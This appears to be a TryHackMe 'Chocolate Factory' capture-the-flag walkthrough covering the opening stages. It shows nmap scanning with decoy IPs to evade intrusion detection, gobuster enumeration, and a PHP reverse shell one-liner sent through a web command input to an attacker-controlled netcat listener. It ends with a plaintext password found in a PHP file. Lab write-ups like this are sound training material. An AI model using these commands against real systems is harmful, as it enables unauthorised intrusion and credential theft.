
![intro](https://github.com/user-attachments/assets/50e81e51-d8d8-4b71-9227-35567c08f0f4)

# tryhackme-Chocolate Factory-writeup
This is a walkthrough for the tryhackme CTF Chocolate Factory. I will not provide any flags or passwords as this is intended to be used as a guide.

## Scanning/Reconnaissance

First off, let's store the target IP as a variable for easy access.

Command: export ip=xx.xx.xx.xx

Next, let's run an nmap scan on the target IP:
```bash
nmap -A -v $ip -D RND:10 -oN nmap.txt
```

Command break down:

-A: This flag enables aggressive scanning. It combines various scan types (like OS detection, version detection, script scanning, and traceroute) into a single scan.

-v: increases verbosity, providing more detailed output during the scan.

—$ip: provides the target IP we stored as the variable $ip.

-D RND:10 Nmap can send additional packets to confuse network intrusion detection systems (IDS) or hide the true source of the scan by randomly selecting up to 10 decoy IP addresses.

-oN nmap.txt: This option specifies normal output that should be saved to a file named “nmap.txt.

This scan reveals many open ports, but I'll just focus on the relavent ones:
![nmap](https://github.com/user-attachments/assets/6967f154-8e11-4172-b1bc-95659d16b9f1)

The web server on port 80 takes to you a login panel that uses a validate.php function. The nmap scan took a while so I also ran scans with gobuster and nikto.
```bash
gobuster dir -u $ip -w=/usr/share/wordlists/dirb/common.txt -x php,txt,jpg -o buster.txt
```
I checked out the home.php dir and it took me to the squirrel room, which has an command input. I will try to run a simple php reverse shell. Let's head to revshells.com, input your IP and desired port, and I'm going to use the PHP exec shell. I'm choosing a short php shell since the site clearly uses php for many of it's functions:
```bash
php -r '$sock=fsockopen("10.10.191.134",9001);exec("sh <&3 >&3 2>&3");'
```
On kali we'll run the netcat listener:
```bash
nc -lvnp 9001
```
We now a primative shell as www-data!
First, let's upgrade the shell for improved function and stability:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```bash
export TERM=xterm
```
ctrl -z
```bash
stty raw -echo; fg
```
```bash
stty rows 16 columns 138
```
Taking a look at www-data's home directory we see validate.php, which includes a password for Charlie:
![charlie](https://github.com/user-attachments/assets/98932712-e5a2-4ebb-ba2c-3659b083fafd)
I tried to switch users to charlie with this password but no luck. Must be a password for the original login on the web server. Let's see what else we can find...
